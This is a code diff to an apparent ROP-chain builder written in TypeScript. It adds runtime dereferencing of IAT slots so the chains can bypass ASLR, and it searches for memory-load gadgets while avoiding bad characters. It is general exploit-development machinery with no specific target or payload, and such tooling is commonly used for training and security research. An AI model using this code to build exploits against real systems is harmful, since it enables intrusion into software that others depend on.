@@ -13,6 +13,9 @@ import { solveValue } from "./value_solver";
 export interface FrameWord {
   value?: number;
   placeholder?: string;
+  // Dereference: write *[derefSlot] (read at runtime). Use for an ASLR'd imported
+  // API — pass its non-ASLR IAT slot and the live pointer is loaded from it.
+  derefSlot?: number;
   comment: string;
 }
 
@@ -116,6 +119,23 @@ function findCleanPop(index: CapabilityIndex, reg: string): RopGadget | undefine
     lastIsRet(g)));
 }
 
+interface MemLoad { gadget: RopGadget; valReg: string; ptrReg: string; }
+
+// mov <valReg>, [<ptrReg>] ; ret  (load a pointer through a register). Used to
+// dereference an IAT slot into a value register at runtime.
+function findMemLoads(index: CapabilityIndex, valRegs: string[]): MemLoad[] {
+  const out: MemLoad[] = [];
+  for (const g of index.gadgets) {
+    if (g.instructions.length !== 2 || g.instructions[0].mnemonic !== "mov" || !lastIsRet(g)) continue;
+    const dst = op(g, 0, 0);
+    if (!valRegs.includes(dst) || dst === "eax") continue;
+    const m = /\[(eax|ebx|ecx|edx|esi|edi|ebp)\]$/.exec(op(g, 0, 1));
+    if (!m || m[1] === "eax") continue; // eax is the frame pointer — never use it as the deref pointer
+    out.push({ gadget: g, valReg: dst, ptrReg: m[1] });
+  }
+  return out.sort((a, b) => (isAddressStable(firstKnownAddress(a.gadget)!) ? 0 : 1) - (isAddressStable(firstKnownAddress(b.gadget)!) ? 0 : 1));
+}
+
 function gadgetStep(g: RopGadget, comment: string): ChainStep {
   return { kind: "gadget", address: firstKnownAddress(g)!, comment };
 }
@@ -148,6 +168,13 @@ interface ResolvedWord {
   reg: string;
   recipe?: NonNullable<ReturnType<typeof solveValue>>; // set when the value is synthesised
   pop?: RopGadget; // set when the value is popped directly
+  deref?: { // set when the value is read from *[slot] at runtime
+    memLoad: RopGadget;
+    ptrReg: string;
+    ptrPop?: RopGadget;
+    ptrRecipe?: NonNullable<ReturnType<typeof solveValue>>;
+    slot: number;
+  };
 }
 
 function planWriteFrameInner(
@@ -180,9 +207,25 @@ function planWriteFrameInner(
 
   // Resolve every word first (pick a store whose value register can hold it),
   // so we either emit a complete frame or report exactly what's missing.
+  const valRegs = stores.map((s) => s.reg);
+  const memLoads = findMemLoads(index, valRegs);
   const resolved: ResolvedWord[] = [];
   for (const word of words) {
-    if (word.placeholder || (word.value !== undefined && isBadcharFree(word.value, bc))) {
+    if (word.derefSlot !== undefined) {
+      // Read *[slot] into a store's value register at runtime (ASLR-proof API).
+      let done = false;
+      for (const load of memLoads) {
+        const store = stores.find((s) => s.reg === load.valReg);
+        if (!store) continue;
+        const ptrPop = isBadcharFree(word.derefSlot, bc) ? popFor(load.ptrReg) : undefined;
+        const ptrRecipe = ptrPop ? undefined : solveValue(index, load.ptrReg, word.derefSlot, badchars, ["eax"]) ?? undefined;
+        if (!ptrPop && !ptrRecipe) continue;
+        resolved.push({ word, store, reg: load.valReg, deref: { memLoad: load.gadget, ptrReg: load.ptrReg, ptrPop, ptrRecipe, slot: word.derefSlot } });
+        done = true;
+        break;
+      }
+      if (!done) unsatisfied.push(`no \`mov <valreg>, [ptr] ; ret\` + settable pointer to deref ${hex(word.derefSlot)} for ${word.comment}`);
+    } else if (word.placeholder || (word.value !== undefined && isBadcharFree(word.value, bc))) {
       const store = stores.find((s) => popFor(s.reg) !== undefined);
       if (!store) { unsatisfied.push(`no store+pop for ${word.comment}`); continue; }
       resolved.push({ word, store, reg: store.reg, pop: popFor(store.reg) });
@@ -223,7 +266,18 @@ function planWriteFrameInner(
       steps.push(...retImmPadding(retImmBytes(advance!.gadget)));
     }
 
-    if (r.recipe) {
+    if (r.deref) {
+      // ptr = slot (pop or construct, preserving eax), then valReg = [ptr].
+      if (r.deref.ptrPop) {
+        steps.push(gadgetStep(r.deref.ptrPop, `pop ${r.deref.ptrReg}`));
+        steps.push({ kind: "value", value: r.deref.slot >>> 0, comment: `${r.deref.ptrReg} = ${hex(r.deref.slot)} (IAT slot of ${r.word.comment})` });
+        steps.push(...retImmPadding(retImmBytes(r.deref.ptrPop)));
+      } else {
+        steps.push(...r.deref.ptrRecipe!.steps);
+      }
+      steps.push(gadgetStep(r.deref.memLoad, `mov ${r.reg}, [${r.deref.ptrReg}]  -> ${r.reg} = *${hex(r.deref.slot)} (${r.word.comment})`));
+      steps.push(...retImmPadding(retImmBytes(r.deref.memLoad)));
+    } else if (r.recipe) {
       steps.push(...r.recipe.steps);
     } else {
       steps.push(gadgetStep(r.pop!, `pop ${r.reg}`));
